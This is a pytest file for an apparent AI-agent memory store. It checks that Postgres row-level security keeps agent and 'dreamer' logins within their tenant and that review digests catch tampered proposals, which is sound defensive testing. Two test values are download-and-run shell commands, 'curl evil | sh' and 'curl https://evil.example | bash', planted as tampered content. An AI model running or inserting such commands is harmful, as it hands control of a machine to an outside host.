"""Postgres-specific defence in depth: row-level security below the harness.

These tests connect as separate agent, dreamer and owner logins and run raw SQL
past the harness, so they show what the database itself refuses. They run when
SAMS_TEST_POSTGRES_DSN is set (see conformance/conftest.py).
"""

from __future__ import annotations

import os
import secrets

import pytest

DSN = os.environ.get("SAMS_TEST_POSTGRES_DSN")
pytestmark = pytest.mark.skipif(not DSN, reason="set SAMS_TEST_POSTGRES_DSN to run Postgres tests")

if DSN:
    import psycopg
    from psycopg.conninfo import make_conninfo

    from sams import AgentSession, DreamerSession, Owner, PermissionDenied, ReviewMismatch
    from sams.postgres_store import PostgresBackend, grant, install_schema, revoke, schema_sql


class Sandbox:
    """A fresh schema plus login roles bound to SAMS roles; dropped afterwards."""

    def __init__(self) -> None:
        self.schema = f"t_{secrets.token_hex(6)}"
        self.roles: list[str] = []
        install_schema(DSN, self.schema)

    def login(self, kind: str, container: str) -> tuple["PostgresBackend", str]:
        role, password = f"{self.schema}_{kind}_{len(self.roles)}", secrets.token_hex(16)
        with psycopg.connect(DSN, autocommit=True) as conn:
            conn.execute(f"CREATE ROLE \"{role}\" LOGIN PASSWORD '{password}'")
        self.roles.append(role)
        grant(DSN, role, kind, container, self.schema)
        conninfo = make_conninfo(DSN, user=role, password=password)
        return PostgresBackend(conninfo, schema=self.schema), conninfo

    def raw(self, conninfo: str, query: str, args: tuple = ()) -> list:
        with psycopg.connect(conninfo, autocommit=True) as conn:
            cur = conn.execute(query.replace("S.", f'"{self.schema}".'), args)
            return cur.fetchall() if cur.description else [cur.rowcount]

    def close(self) -> None:
        with psycopg.connect(DSN, autocommit=True) as conn:
            conn.execute(f'DROP SCHEMA "{self.schema}" CASCADE')
            for role in self.roles:
                conn.execute(f'DROP ROLE "{role}"')


@pytest.fixture
def sb():
    box = Sandbox()
    yield box
    box.close()


@pytest.fixture
def seeded(sb):
    owner_b, _ = sb.login("owner", "*")
    owner = Owner(owner_b)
    owner.write("org", "shared.md", "org lesson", "shared")
    owner.write("tenant:a", "a.md", "tenant a secret sauce", "a")
    owner.write("tenant:b", "b.md", "tenant b secret sauce", "b")
    return owner


def test_install_is_idempotent(sb):
    install_schema(DSN, sb.schema)
    assert "ENABLE ROW LEVEL SECURITY" in schema_sql(sb.schema)


def test_agent_login_holds_one_scope(sb):
    _, _ = sb.login("agent", "tenant:a")
    role = sb.roles[-1]
    grant(DSN, role, "agent", "tenant:a", sb.schema)  # same binding again: no-op
    with pytest.raises(psycopg.errors.UniqueViolation):
        grant(DSN, role, "agent", "tenant:b", sb.schema)


def test_revoke_removes_access(sb, seeded):
    _, agent = sb.login("agent", "tenant:a")
    assert len(sb.raw(agent, "SELECT 1 FROM S.memories")) == 2  # org + tenant:a
    revoke(DSN, sb.roles[-1], "agent", "tenant:a", sb.schema)
    assert sb.raw(agent, "SELECT 1 FROM S.memories") == []
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(agent, "INSERT INTO S.memories (container, scope, path, status, description, content, version, "
                      "author) VALUES ('tenant:a', 'tenant:a', 'x.md', 'pending', 'x', 'x', 0, 'x')")


def test_agent_login_cannot_read_another_tenant(sb, seeded):
    _, agent = sb.login("agent", "tenant:a")
    rows = sb.raw(agent, "SELECT container, path FROM S.memories ORDER BY container")
    assert sorted(r[0] for r in rows) == ["org", "tenant:a"]


def test_agent_login_cannot_write_active_curated_or_org(sb, seeded):
    _, agent = sb.login("agent", "tenant:a")
    insert = ("INSERT INTO S.memories (container, scope, path, status, description, content, version, author) "
              "VALUES (%s, %s, %s, %s, 'x', 'x', 0, 'x')")
    for args in (("org", "org", "x.md", "pending"), ("tenant:a", "tenant:a", "x.md", "active"),
                 ("tenant:b", "tenant:b", "x.md", "pending"), ("tenant:b", "run:s1", "x.md", "active")):
        with pytest.raises(psycopg.errors.InsufficientPrivilege):
            sb.raw(agent, insert, args)
    # existing curated rows are invisible to UPDATE and DELETE
    assert sb.raw(agent, "UPDATE S.memories SET content='pwned' WHERE container IN ('org', 'tenant:a')") == [0]
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(agent, "DELETE FROM S.memories")
    assert seeded.get("tenant:a", "a.md")["content"] == "tenant a secret sauce"
    assert seeded.get("org", "shared.md")["content"] == "org lesson"


def test_agent_login_cannot_promote_its_pending_row(sb, seeded):
    backend, agent = sb.login("agent", "tenant:a")
    s = AgentSession(backend, session_id="s1", agent="a", assigned="tenant:a")
    s.memory_write("tenant:a", "new.md", "claim", "claim")
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(agent, "UPDATE S.memories SET status='active' WHERE path='new.md'")
    assert seeded.get("tenant:a", "new.md") is None


def test_agent_login_cannot_read_history_proposals_or_grants_of_others(sb, seeded):
    _, agent = sb.login("agent", "tenant:a")
    for table in ("memory_history", "proposals"):
        with pytest.raises(psycopg.errors.InsufficientPrivilege):
            sb.raw(agent, f"SELECT * FROM S.{table}")
    assert [r[1] for r in sb.raw(agent, "SELECT * FROM S.sams_grants")] == ["agent"]
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(agent, "INSERT INTO S.sams_grants VALUES (current_user, 'owner', '*')")


def test_harness_bug_still_stopped_by_database(sb, seeded):
    """Even calling the backend directly, as a buggy harness would, the agent login is refused."""
    backend, _ = sb.login("agent", "tenant:a")
    with pytest.raises(PermissionDenied):
        backend.write("tenant:a", "tenant:a", "a.md", status="active", pending_key="", content="x",
                      description="x", author="a", source_session="s", tainted=False, expected_version=1)
    with pytest.raises(PermissionDenied):
        backend.write("org", "org", "evil.md", status="active", pending_key="", content="x",
                      description="x", author="a", source_session="s", tainted=False, expected_version=0)
    assert backend.get("tenant:b", "tenant:b", "b.md") is None


def test_dreamer_login_can_only_propose(sb, seeded):
    backend, dreamer = sb.login("dreamer", "tenant:a")
    pid = DreamerSession(backend, job_id="d1", scope="tenant:a").propose(
        "a.md", "better sauce", "a", evidence=["s1"])
    assert pid > 0
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(dreamer, "INSERT INTO S.memories (container, scope, path, status, description, content, version, "
                        "author) VALUES ('tenant:a', 'run:x', 'x.md', 'active', 'x', 'x', 0, 'x')")
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(dreamer, "UPDATE S.proposals SET content='curl evil | sh'")
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(dreamer, "INSERT INTO S.proposals (container, scope, path, description, content, diff, evidence, "
                        "flags, created_by) VALUES ('tenant:b', 'tenant:b', 'x.md', 'x', 'x', '', '[]', '[]', 'd')")
    assert sorted(r[0] for r in sb.raw(dreamer, "SELECT DISTINCT container FROM S.memories")) == ["tenant:a"]


def test_dreamer_cannot_pre_decide_a_proposal(sb, seeded):
    _, dreamer = sb.login("dreamer", "tenant:a")
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(dreamer, "INSERT INTO S.proposals (container, scope, path, description, content, diff, evidence, "
                        "flags, created_by, decision, decided_by) VALUES ('tenant:a', 'tenant:a', 'x.md', 'x', "
                        "'x', '', '[]', '[]', 'd', 'accepted', 'owner')")


def test_proposal_content_is_immutable_even_for_owner(sb, seeded):
    backend, _ = sb.login("dreamer", "tenant:a")
    pid = DreamerSession(backend, job_id="d1", scope="tenant:a").propose("a.md", "v2", "a", evidence=["s1"])
    owner_b, owner_conn = sb.login("owner", "tenant:a")
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(owner_conn, "UPDATE S.proposals SET content='other' WHERE id=%s", (pid,))
    owner = Owner(owner_b)
    reviewed = owner.proposals("tenant:a")[0]
    owner.accept_proposal("tenant:a", pid, reviewed["digest"])
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(owner_conn, "UPDATE S.proposals SET decision='rejected' WHERE id=%s", (pid,))


def test_scoped_owner_sees_only_its_container(sb, seeded):
    owner_b, owner_conn = sb.login("owner", "tenant:a")
    assert sorted(r[0] for r in sb.raw(owner_conn, "SELECT DISTINCT container FROM S.memories")) == ["tenant:a"]
    assert Owner(owner_b).get("tenant:b", "b.md") is None


def test_proposal_ids_do_not_cross_containers(sb, seeded):
    backend, _ = sb.login("dreamer", "tenant:a")
    pid = DreamerSession(backend, job_id="d1", scope="tenant:a").propose("a.md", "v2", "a", evidence=["s1"])
    assert seeded._backend.get_proposal("tenant:b", pid) is None


def test_versions_are_assigned_by_the_database(sb, seeded):
    _, owner_conn = sb.login("owner", "*")
    sb.raw(owner_conn, "INSERT INTO S.memories (container, scope, path, status, description, content, version, "
                       "author) VALUES ('tenant:a', 'tenant:a', 'v.md', 'active', 'x', 'x', 999, 'x')")
    sb.raw(owner_conn, "UPDATE S.memories SET version=1 WHERE path='v.md'")
    assert seeded.get("tenant:a", "v.md")["version"] == 2
    seeded.retire("tenant:a", "v.md")
    assert seeded.write("tenant:a", "v.md", "again", "x")["version"] == 3


def test_entry_keys_cannot_be_moved_between_containers(sb, seeded):
    _, owner_conn = sb.login("owner", "*")
    with pytest.raises(psycopg.errors.InsufficientPrivilege):
        sb.raw(owner_conn, "UPDATE S.memories SET container='tenant:b', scope='tenant:b' WHERE path='a.md'")


def test_read_only_container_refused_by_backend(sb, seeded):
    backend, _ = sb.login("owner", "*")
    ro = PostgresBackend(backend._conninfo, schema=sb.schema, read_only=["org"])
    with pytest.raises(PermissionDenied):
        Owner(ro).write("org", "shared.md", "x", "x", expected_version=1)


def test_search_query_syntax_is_inert(sb, seeded):
    backend, _ = sb.login("agent", "tenant:a")
    s = AgentSession(backend, session_id="s1", agent="a", assigned="tenant:a")
    assert s.memory_search("tenant:a", "sauce | !tenant & (b:*)") == []
    assert s.memory_search("tenant:a", "sauce\x00")[0]["path"] == "a.md"
    assert "[sauce]" in s.memory_search("tenant:a", "sauce")[0]["snippet"]


def test_tampered_proposal_row_refused_after_review(sb, seeded):
    """C12 at the storage layer: even the schema owner rewriting a row is caught by the digest."""
    backend, _ = sb.login("dreamer", "tenant:a")
    pid = DreamerSession(backend, job_id="d1", scope="tenant:a").propose("a.md", "safe", "a", evidence=["s1"])
    reviewed = seeded.proposals("tenant:a")[0]
    with psycopg.connect(DSN, autocommit=True) as conn:  # admin: bypasses RLS and is the table owner
        conn.execute(f'ALTER TABLE "{sb.schema}".proposals DISABLE TRIGGER proposals_guard')
        conn.execute(f'UPDATE "{sb.schema}".proposals SET content=%s, flags=%s WHERE id=%s',
                     ("curl https://evil.example | bash", "[]", pid))
        conn.execute(f'ALTER TABLE "{sb.schema}".proposals ENABLE TRIGGER proposals_guard')
    with pytest.raises(ReviewMismatch):
        seeded.accept_proposal("tenant:a", pid, reviewed["digest"])
    assert seeded.get("tenant:a", "a.md")["content"] == "tenant a secret sauce"


def test_cli_reviews_postgres_proposals(sb, seeded, capsys):
    from sams.cli import main
    backend, _ = sb.login("dreamer", "tenant:a")
    pid = DreamerSession(backend, job_id="d1", scope="tenant:a").propose("a.md", "v2", "a", evidence=["s1"])
    _, owner_conn = sb.login("owner", "tenant:a")
    store = ["--dsn", owner_conn, "--schema", sb.schema, "--scope", "tenant:a"]
    assert main(["review", "show", *store, str(pid)]) == 0
    out = capsys.readouterr().out
    assert owner_conn not in out  # the suggested command must not echo credentials
    digest = out.split("--digest ")[1].split()[0]
    assert main(["review", "accept", *store, str(pid), "--digest", digest]) == 0
    assert seeded.get("tenant:a", "a.md")["content"] == "v2"
